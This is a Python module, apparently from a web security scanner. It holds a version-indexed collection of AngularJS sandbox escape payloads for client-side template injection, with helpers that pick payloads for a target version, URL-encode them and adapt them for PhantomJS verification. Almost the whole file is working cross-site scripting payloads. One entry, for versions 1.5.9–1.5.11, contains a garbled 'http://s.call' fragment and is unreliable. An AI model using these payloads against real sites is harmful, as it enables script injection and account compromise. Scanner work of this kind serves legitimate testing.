# -*- coding: utf-8 -*-

# MIT License
#
# Copyright (c) 2017 Tijme Gommers
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import copy

try: # Python 3
    from urllib.parse import quote_plus
except: # Python 2
    from urllib import quote_plus

class Payloads:
    """The Payloads class which contains all the AngularJS sandbox escape payloads.

    Attributes:
        __cache (obj): Cached lists of payloads for specific AngularJS versions.
        __payloads list(obj): All the AngularJS sandbox escape payloads.

    """

    __cache = {}

    __payloads = [
        {
            "min": "1.0.0",
            "max": "1.1.5",
            "value": """{{constructor.constructor('alert(1)')()}}""",
            "message": None
        },
        {
            "min": "1.2.0",
            "max": "1.2.1",
            "value": """{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}""",
            "message": None
        },
        {
            "min": "1.2.2",
            "max": "1.2.5",
            "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}""",
            "message": None
        },
        {
            "min": "1.2.6",
            "max": "1.2.18",
            "value": """{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}""",
            "message": None
        },
        {
            "min": "1.2.19",
            "max": "1.2.23",
            "value": """{{c=toString.constructor;p=c.prototype;p.toString=p.call;["alert(1)","a"].sort(c)}}""",
            "message": """Depending on your web browser's sorting algorithm, the ["alert(1)","a"] array must be reversed in order to execute the alert."""
        },
        {
            "min": "1.2.19",
            "max": "1.2.26",
            "value": """{{(!call?$$watchers[0].get(toString.constructor.prototype):(a=apply)&&(apply=constructor)&&(valueOf=call)&&(''+''.toString('F =Function.prototype;'+'F.apply = F.a;'+'delete F.a;'+'delete F.valueOf;'+'alert(42);')));}}""",
            "message": None
        },
        {
            "min": "1.2.24",
            "max": "1.2.32",
            "value": """{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",alert(alert=1),"')}}""",
            "message": None
        },
        {
            "min": "1.3.0",
            "max": "1.3.0",
            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}""",
            "message": None
        },
        {
            "min": "1.3.0",
            "max": "1.5.8",
            "value": """{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}""",
            "message": None
        },
        {
            "min": "1.3.1",
            "max": "1.3.2",
            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}""",
            "message": None
        },
        {
            "min": "1.3.3",
            "max": "1.3.18",
            "value": """{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}""",
            "message": None
        },
        {
            "min": "1.3.19",
            "max": "1.3.19",
            "value": """{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}""",
            "message": None
        },
        {
            "min": "1.3.20",
            "max": "1.3.20",
            "value": """{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}""",
            "message": None
        },
        {
            "min": "1.4.0",
            "max": "1.4.14",
            "value": """{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}""",
            "message": None
        },
        {
            "min": "1.4.10",
            "max": "1.5.8",
            "value": """{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}""",
            "message": None
        },
        {
            "min": "1.5.9",
            "max": "1.5.11",
            "value": """{{s=[].push;b=s.bind;c=http://s.call ;c.$apply=$apply;c.$eval=b;$digest=s;C=c.$apply(c);$$phase=0;B=C(b,c,b);$evalAsync("y=pop();y.type='UnaryExpression';y.operator='alert';y.argument=1");l=B($$asyncQueue.pop().expression);s.apply=B(C,0,l);$eval("s(q)")}}""",
            "message": None
        },
        {
            "min": "1.6.0",
            "max": "1.6.5",
            "value": """{{[].pop.constructor('alert(1)')()}}""",
            "message": None
        }
    ]

    @staticmethod
    def get_for_version(version):
        """Get AngularJS sandbox escape payloads for the given AngularJS version.

        Args:
            version (str): The AngularJS version to get payloads for (e.g. `1.4.2`).

        Returns:
            list(obj): A list of payloads.

        """

        if version in Payloads.__cache:
            return Payloads.__cache[version]

        payloads = []

        for payload in Payloads.__payloads:
            if Payloads.version_is_in_range(version, payload["min"], payload["max"]):
                payloads.append(payload)

                payload_encoded = copy.deepcopy(payload)
                payload_encoded["value"] = quote_plus(payload_encoded["value"])
                payloads.append(payload_encoded)

        Payloads.__cache[version] = payloads
        return payloads

    @staticmethod
    def get_verify_payload(payload):
        """Replace `alert` with `open` so PhantomJS checks can be done.

        Args:
            payload (obj): The current payload.

        Returns:
            obj: The new payload.

        Note:
            PhantomJS does not support switching to alerts, which is why we need
            the `open` call, which opens a new window. So if the open window count
            is 2, the payload worked.

        """

        verify_payload = copy.deepcopy(payload)
        verify_payload["value"] = verify_payload["value"].replace("alert", "open")
        return verify_payload

    @staticmethod
    def version_is_in_range(version, minimum, maximum):
        """Check if the given version is within the given range.

        Args:
            version (str): The AngularJS version to check.
            minimum (str): The minimum version.
            maximum (str): The maximum version.

        Returns:
            bool: True if in range, False otherwise

        """

        req_major, req_minor, req_patch = version.split(".")
        min_major, min_minor, min_patch = minimum.split(".")
        max_major, max_minor, max_patch = maximum.split(".")

        required = int(req_major.zfill(2) + req_minor.zfill(2) + req_patch.zfill(2))
        minimum = int(min_major.zfill(2) + min_minor.zfill(2) + min_patch.zfill(2))
        maximum = int(max_major.zfill(2) + max_minor.zfill(2) + max_patch.zfill(2))

        if required >= minimum and required <= maximum:
            return True

        return False
